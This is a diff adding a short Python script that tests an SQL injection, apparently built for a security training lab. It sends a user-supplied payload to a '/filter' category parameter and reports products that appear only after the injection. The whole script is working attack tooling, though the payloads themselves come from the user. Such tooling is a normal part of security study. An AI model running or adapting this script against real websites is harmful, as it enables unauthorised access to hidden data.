@@ -1,0 +1,64 @@
+import requests
+import sys
+from bs4 import BeautifulSoup  # For parsing HTML
+
+# Uncomment if using Burp Suite
+# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def get_visible_items(html):
+    """Extract visible product/item names from the response HTML."""
+    soup = BeautifulSoup(html, "html.parser")
+    
+    # Modify this selector based on the website structure
+    items = [item.get_text(strip=True) for item in soup.find_all("h3")]  
+    
+    return set(items)
+
+def exploit_sql(url, payload):
+    """Check if SQL injection reveals new items on the webpage."""
+    uri = "/filter"
+    params = {"category": ""}  # Baseline request (normal page)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+    }
+    
+    try:
+        # Step 1: Get baseline items
+        r_base = requests.get(url, params=params, headers=headers, verify=True, timeout=10)
+        r_base.raise_for_status()
+        baseline_items = get_visible_items(r_base.text)
+
+        # Step 2: Inject payload and fetch response
+        params["category"] = payload
+        r_exploit = requests.get(url + uri, params=params, headers=headers, verify=True, timeout=10)
+        r_exploit.raise_for_status()
+        new_items = get_visible_items(r_exploit.text)
+
+        # Step 3: Compare results
+        added_items = new_items - baseline_items  # Items that appear only after exploitation
+        if added_items:
+            return True, added_items
+        else:
+            return False, None
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Request failed: {e}")
+        return False, None
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <url> <payload>")
+        sys.exit(-1)
+
+    url = sys.argv[1].strip()
+    payload = sys.argv[2].strip()
+
+    print(f"[*] Testing SQL Injection on {url} with payload: {payload}")
+
+    success, items = exploit_sql(url, payload)
+    if success:
+        print("[+] SQL Injection successful! New items displayed:")
+        for item in items:
+            print(f"    - {item}")
+    else:
+        print("[-] SQL Injection failed. No new items found.")
